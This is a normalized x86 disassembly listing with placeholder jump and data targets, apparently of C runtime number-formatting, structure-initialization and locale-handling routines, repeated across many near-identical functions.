jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c437
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_448b80
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c4bf
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
push edi
lea ecx [ esi + 0x40 ]
mov edi [ ecx + 0x404 ]
test edi edi
jne r-xdata
call sub_419019
mov edx [ ebp + 0xc ]
dec eax
mov ebx [ ebp + 0x8 ]
add edi eax
mov [ esi + 0x34 ] edi
mov edi ecx
push 0x0
push [ ebp + 0x10 ]
lea eax [ ecx - 0x1 ]
push edx
push ebx
mov [ esi + 0x28 ] eax
call sub_448b80
add cl 0x30
mov [ ebp - 0x4 ] ebx
mov ebx eax
cmp cl 0x39
jle r-xdata
mov eax ebx
or eax edx
je r-xdata
mov eax [ esi + 0x34 ]
mov [ eax ] cl
dec [ esi + 0x34 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
sete al
dec al
and al 0xe0
add al 0x61
sub al 0x3a
add cl al
mov eax [ esi + 0x34 ]
sub edi eax
mov [ esi + 0x38 ] edi
inc eax
pop edi
mov [ esi + 0x34 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ esi + 0x28 ]
test ecx ecx
jg r-xdata
sub_41c547
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x10 ] esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push [ ebp + 0xc ]
call sub_42833f
cmp [ edi ] 0xffffffff
je r-xdata
sub_41c573
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x10 ] esi
jle r-xdata
pop esi
pop ebp
retn
push ebx
movsx bx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
pop edi
pop ebx
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ebx
call sub_42837c
cmp [ edi ] 0xffffffff
je r-xdata
sub_41c5a4
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x10 ] esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push [ ebp + 0xc ]
call sub_4283bc
cmp [ edi ] 0xffffffff
je r-xdata
sub_41c5d0
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x10 ] esi
jle r-xdata
pop esi
pop ebp
retn
push ebx
movsx bx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
pop edi
pop ebx
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ebx
call sub_4283fe
cmp [ edi ] 0xffffffff
je r-xdata
sub_41c613
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_41c64d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_41c687
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_41c6d3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_41c70d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_41c7a1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov [ ecx + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ecx + 0xc ] eax
mov eax [ ebp + 0x18 ]
mov [ ecx + 0x10 ] eax
mov eax ecx
pop ebp
retn 0x14
sub_41c7c9
mov edi edi
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ ebp - 0x4 ] ecx
mov [ ecx ] eax
mov [ ecx + 0x4 ] eax
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] eax
mov [ ecx + 0x10 ] eax
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x18 ] eax
mov [ ecx + 0x1c ] eax
mov [ ecx + 0x20 ] eax
mov [ ecx + 0x24 ] eax
mov [ ecx + 0x28 ] eax
mov [ ecx + 0x30 ] ax
mov [ ecx + 0x38 ] eax
mov [ ecx + 0x3c ] al
mov [ ecx + 0x440 ] eax
mov [ ecx + 0x444 ] eax
mov eax ecx
mov esp ebp
pop ebp
retn
sub_41c810
mov edi edi
push ebp
mov ebp esp
push ecx
xor edx edx
mov [ ebp - 0x4 ] ecx
xor eax eax
mov [ ecx ] edx
mov [ ecx + 0x32 ] ax
mov eax ecx
mov [ ecx + 0x4 ] edx
mov [ ecx + 0x8 ] edx
mov [ ecx + 0xc ] edx
mov [ ecx + 0x10 ] edx
mov [ ecx + 0x14 ] edx
mov [ ecx + 0x18 ] edx
mov [ ecx + 0x1c ] edx
mov [ ecx + 0x20 ] edx
mov [ ecx + 0x24 ] edx
mov [ ecx + 0x28 ] edx
mov [ ecx + 0x30 ] dl
mov [ ecx + 0x38 ] edx
mov [ ecx + 0x3c ] dl
mov [ ecx + 0x440 ] edx
mov [ ecx + 0x444 ] edx
mov esp ebp
pop ebp
retn
sub_41c85c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41c7c9
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ esi + 0x448 ] eax
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c898
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41c7c9
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ esi + 0x448 ] eax
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c8d4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41c810
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ esi + 0x448 ] eax
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c910
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41c810
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ esi + 0x448 ] eax
mov eax [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ esi + 0x14 ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c94c
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c85c
and [ esi + 0x450 ] 0x0
call sub_430f56
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c981
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x1c ]
mov esi ecx
push eax
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_417c4d
call sub_430f56
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c9b0
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c85c
and [ esi + 0x450 ] 0x0
call sub_430f56
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41c9e5
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c898
and [ esi + 0x450 ] 0x0
call sub_430f56
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41ca1a
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x1c ]
mov esi ecx
push eax
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_417d8d
call sub_430f56
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41ca49
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c898
and [ esi + 0x450 ] 0x0
call sub_430f56
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41ca7e
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c8d4
and [ esi + 0x450 ] 0x0
call sub_430f56
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41cab3
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x1c ]
mov esi ecx
push eax
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_417ced
call sub_430f56
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41cae2
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c8d4
and [ esi + 0x450 ] 0x0
call sub_430f56
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41cb17
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c910
and [ esi + 0x450 ] 0x0
call sub_430f56
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41cb4c
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x1c ]
mov esi ecx
push eax
lea eax [ ebp + 0x18 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_417e2d
call sub_430f56
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41cb7b
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x1c ]
mov esi ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41c910
and [ esi + 0x450 ] 0x0
call sub_430f56
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x18
sub_41cbf0
mov edi edi
push ebp
mov ebp esp
push edi
mov edi ecx
mov ecx [ ebp + 0x8 ]
mov [ edi + 0xc ] 0x0
test ecx ecx
je r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ ecx ]
mov [ edi + 0x4 ] eax
mov eax [ ecx + 0x4 ]
jmp r-xdata
push esi
call sub_430a7e
lea edx [ edi + 0x4 ]
mov [ edi ] eax
push edx
lea esi [ edi + 0x8 ]
mov ecx [ eax + 0x4c ]
mov [ edx ] ecx
mov ecx [ eax + 0x48 ]
push eax
mov [ esi ] ecx
call sub_434ba8
push esi
push [ edi ]
call sub_434bd5
mov ecx [ edi ]
add esp 0x10
mov eax [ ecx + 0x350 ]
pop esi
test al 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x4 ] eax
mov eax [ rw-data ]
mov [ edi + 0x8 ] eax
jmp r-xdata
mov eax edi
pop edi
pop ebp
retn 0x4
or eax 0x2
mov [ ecx + 0x350 ] eax
mov [ edi + 0xc ] 0x1
sub_41cdc7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push [ esi ]
call sub_42d3b1
mov edx [ ebp + 0x8 ]
and [ esi ] 0x0
pop ecx
mov eax [ edx ]
mov [ esi ] eax
mov eax esi
and [ edx ] 0x0
pop esi
pop ebp
retn 0x4
sub_41cdf4
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_432ec0
mov [ ebp - 0x464 ] al
mov eax [ esi + 0x4 ]
pop ecx
lea ecx [ ebp - 0x478 ]
push [ eax ]
call sub_41cbf0
mov eax [ esi ]
lea ecx [ ebp - 0x45c ]
mov eax [ eax ]
mov [ ebp - 0x460 ] eax
mov eax [ esi + 0x10 ]
push [ eax ]
lea eax [ ebp - 0x474 ]
push eax
mov eax [ esi + 0xc ]
push [ eax ]
mov eax [ esi + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x460 ]
push eax
call sub_41ca7e
lea ecx [ ebp - 0x45c ]
call sub_41eb66
lea ecx [ ebp - 0x41c ]
mov esi eax
call sub_41cdad
cmp [ ebp - 0x46c ] 0x0
je r-xdata
push edi
push [ ebp - 0x464 ]
call sub_432f75
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x478 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41ceba
mov edi edi
push ebp
mov ebp esp
sub esp 0xae4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_432ec0
mov [ ebp - 0xae0 ] al
mov eax [ esi + 0x4 ]
pop ecx
lea ecx [ ebp - 0xadc ]
push [ eax ]
call sub_41cbf0
mov eax [ esi ]
mov ecx [ esi + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xab8 ] eax
mov eax [ esi + 0x10 ]
mov eax [ eax ]
mov [ ebp - 0xabc ] eax
lea eax [ ebp - 0xad8 ]
mov [ ebp - 0xac0 ] eax
mov eax [ esi + 0xc ]
mov eax [ eax ]
mov [ ebp - 0xac4 ] eax
mov eax [ ecx ]
mov [ ebp - 0xacc ] eax
mov eax [ ecx + 0x4 ]
lea ecx [ ebp - 0xab4 ]
mov [ ebp - 0xac8 ] eax
lea eax [ ebp - 0xabc ]
push eax
lea eax [ ebp - 0xac0 ]
push eax
lea eax [ ebp - 0xac4 ]
push eax
lea eax [ ebp - 0xacc ]
push eax
lea eax [ ebp - 0xab8 ]
push eax
call sub_417c4d
call sub_430f56
lea ecx [ ebp - 0xab4 ]
mov [ ebp - 0xaa8 ] eax
call sub_41e54e
lea ecx [ ebp - 0xa74 ]
mov esi eax
call sub_41cdad
cmp [ ebp - 0xad0 ] 0x0
je r-xdata
push edi
push [ ebp - 0xae0 ]
call sub_432f75
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xadc ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41cfc4
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_432ec0
mov [ ebp - 0x464 ] al
mov eax [ esi + 0x4 ]
pop ecx
lea ecx [ ebp - 0x478 ]
push [ eax ]
call sub_41cbf0
mov eax [ esi ]
lea ecx [ ebp - 0x45c ]
mov eax [ eax ]
mov [ ebp - 0x460 ] eax
mov eax [ esi + 0x10 ]
push [ eax ]
lea eax [ ebp - 0x474 ]
push eax
mov eax [ esi + 0xc ]
push [ eax ]
mov eax [ esi + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x460 ]
push eax
call sub_41cae2
lea ecx [ ebp - 0x45c ]
call sub_41edf6
lea ecx [ ebp - 0x41c ]
mov esi eax
call sub_41cdad
cmp [ ebp - 0x46c ] 0x0
je r-xdata
push edi
push [ ebp - 0x464 ]
call sub_432f75
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x478 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41d093
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_432ec0
mov [ ebp - 0x464 ] al
mov eax [ esi + 0x4 ]
pop ecx
lea ecx [ ebp - 0x478 ]
push [ eax ]
call sub_41cbf0
mov eax [ esi ]
lea ecx [ ebp - 0x45c ]
mov eax [ eax ]
mov [ ebp - 0x460 ] eax
mov eax [ esi + 0x10 ]
push [ eax ]
lea eax [ ebp - 0x474 ]
push eax
mov eax [ esi + 0xc ]
push [ eax ]
mov eax [ esi + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x460 ]
push eax
call sub_41c9b0
lea ecx [ ebp - 0x45c ]
call sub_41e6aa
lea ecx [ ebp - 0x41c ]
mov esi eax
call sub_41cdad
cmp [ ebp - 0x46c ] 0x0
je r-xdata
push edi
push [ ebp - 0x464 ]
call sub_432f75
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x478 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41d159
mov edi edi
push ebp
mov ebp esp
sub esp 0xae4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_432ec0
mov [ ebp - 0xae0 ] al
mov eax [ esi + 0x4 ]
pop ecx
lea ecx [ ebp - 0xadc ]
push [ eax ]
call sub_41cbf0
mov eax [ esi ]
mov ecx [ esi + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xab8 ] eax
mov eax [ esi + 0x10 ]
mov eax [ eax ]
mov [ ebp - 0xabc ] eax
lea eax [ ebp - 0xad8 ]
mov [ ebp - 0xac0 ] eax
mov eax [ esi + 0xc ]
mov eax [ eax ]
mov [ ebp - 0xac4 ] eax
mov eax [ ecx ]
mov [ ebp - 0xacc ] eax
mov eax [ ecx + 0x4 ]
lea ecx [ ebp - 0xab4 ]
mov [ ebp - 0xac8 ] eax
lea eax [ ebp - 0xabc ]
push eax
lea eax [ ebp - 0xac0 ]
push eax
lea eax [ ebp - 0xac4 ]
push eax
lea eax [ ebp - 0xacc ]
push eax
lea eax [ ebp - 0xab8 ]
push eax
call sub_417ced
call sub_430f56
lea ecx [ ebp - 0xab4 ]
mov [ ebp - 0xaa8 ] eax
call sub_41ec96
lea ecx [ ebp - 0xa74 ]
mov esi eax
call sub_41cdad
cmp [ ebp - 0xad0 ] 0x0
je r-xdata
push edi
push [ ebp - 0xae0 ]
call sub_432f75
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xadc ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41d290
mov edi edi
push ebp
mov ebp esp
sub esp 0x478
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
mov eax [ esi ]
mov edi [ eax ]
push edi
call sub_432ec0
mov [ ebp - 0x464 ] al
mov eax [ esi + 0x4 ]
pop ecx
lea ecx [ ebp - 0x478 ]
push [ eax ]
call sub_41cbf0
mov eax [ esi ]
lea ecx [ ebp - 0x45c ]
mov eax [ eax ]
mov [ ebp - 0x460 ] eax
mov eax [ esi + 0x10 ]
push [ eax ]
lea eax [ ebp - 0x474 ]
push eax
mov eax [ esi + 0xc ]
push [ eax ]
mov eax [ esi + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x460 ]
push eax
call sub_41c94c
lea ecx [ ebp - 0x45c ]
call sub_41e426
lea ecx [ ebp - 0x41c ]
mov esi eax
call sub_41cdad
cmp [ ebp - 0x46c ] 0x0
je r-xdata
push edi
push [ ebp - 0x464 ]
call sub_432f75
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax esi
pop edi
xor ecx ebp
pop esi
call sub_40c38e
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x478 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41d351
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d36f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d38d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d3ab
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d3c9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d3e7
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d405
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d423
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d441
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d45f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d47d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d49b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
cmp [ ebp + 0xc ] cl
sete cl
add eax 0xffffffc6
dec ecx
and ecx 0xffffffe0
add ecx 0x61
add eax ecx
pop ebp
retn
sub_41d4b9
mov eax ecx
inc [ eax + 0x458 ]
mov ecx [ eax + 0x458 ]
cmp ecx 0x3
jne r-xdata
cmp ecx 0x2
jne r-xdata
xor al al
retn
or [ eax + 0xaa4 ] 0xffffffff
xor ecx ecx
or [ eax + 0xaa8 ] 0xffffffff
mov [ eax + 0x45c ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov ecx [ eax + 0x460 ]
mov [ eax + 0x10 ] ecx
mov al 0x1
retn
cmp [ eax + 0x45c ] 0x1
je r-xdata
sub_41d505
mov eax ecx
inc [ eax + 0x458 ]
mov ecx [ eax + 0x458 ]
cmp ecx 0x3
jne r-xdata
cmp ecx 0x2
jne r-xdata
xor al al
retn
